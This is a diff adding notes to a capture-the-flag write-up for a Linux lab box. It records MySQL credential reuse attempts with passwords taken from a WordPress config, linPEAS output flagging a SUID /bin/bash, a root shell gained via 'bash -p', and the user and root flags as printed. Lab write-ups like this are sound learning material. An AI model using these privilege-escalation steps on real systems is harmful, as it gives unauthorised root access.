@@ -285,3 +285,63 @@ define( 'DB_PASSWORD', 'devteam01' );
 define( 'DB_HOST', 'localhost' );
 
 ```
+
+lets try:
+- mysql -D dev --user dev -p development01 --> timeout
+- mysql -D dev --user devtest -p devteam01 --> access denied
+
+More output:
+```
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+[+] SUID - Check easy privesc, exploits and write perms                                                                                                                                                                                      
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                
+-rwsr-sr-x 1 root root       540K Dec 22 05:46 /bin/bash                                                                                                                                                                                     
+-rws--x--- 1 root messagebus  31K Dec 22 05:48 /usr/libexec/dbus-daemon-launch-helper
+-rws--x--- 1 root power       18K Jan 15 15:33 /usr/bin/powerd_setuid_helper
+/usr/local/bin/strings: /usr/bin/powerd_setuid_helper: Permission denied
+  --- Trying to execute /usr/bin/powerd_setuid_helper with strace in order to look for hijackable libraries...
+
+-rwsr-xr-x 1 root root       563K Feb 11 01:04 /usr/bin/sudo  --->  /sudo$
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                
+-rwsr-sr-x 1 root root 540K Dec 22 05:46 /bin/bash    
+```
+
+https://pentestlab.blog/2017/09/25/suid-executables/
+
+https://unix.stackexchange.com/questions/116792/privileged-mode-in-bash
+
+From the bash info page:
+
+    `-p'
+
+          Turn on privileged mode.  In this mode, the `$BASH_ENV' and
+          `$ENV' files are not processed, shell functions are not
+          inherited from the environment, and the `SHELLOPTS',
+          `BASHOPTS', `CDPATH' and `GLOBIGNORE' variables, if they
+          appear in the environment, are ignored.  If the shell is
+          started with the effective user (group) id not equal to the
+          real user (group) id, and the `-p' option is not supplied,
+          these actions are taken and the effective user id is set to
+          the real user id.  If the `-p' option is supplied at startup,
+          the effective user id is not reset.  Turning this option off
+          causes the effective user and group ids to be set to the real
+          user and group ids.
+
+
+```
+$ bash -p
+whoami && id && pwd
+root
+uid=20155(nginx) gid=20156(nginx) euid=0(root) egid=0(root) groups=0(root),20156(nginx)
+/home/nginx
+```
+
+```
+cat /home/katie/user.txt
+e89d27fe195e9114ffa72ba8913a6130
+cat /root/root.txt
+d44519713b889d5e1f9e536d0c6df2fc
+```
+
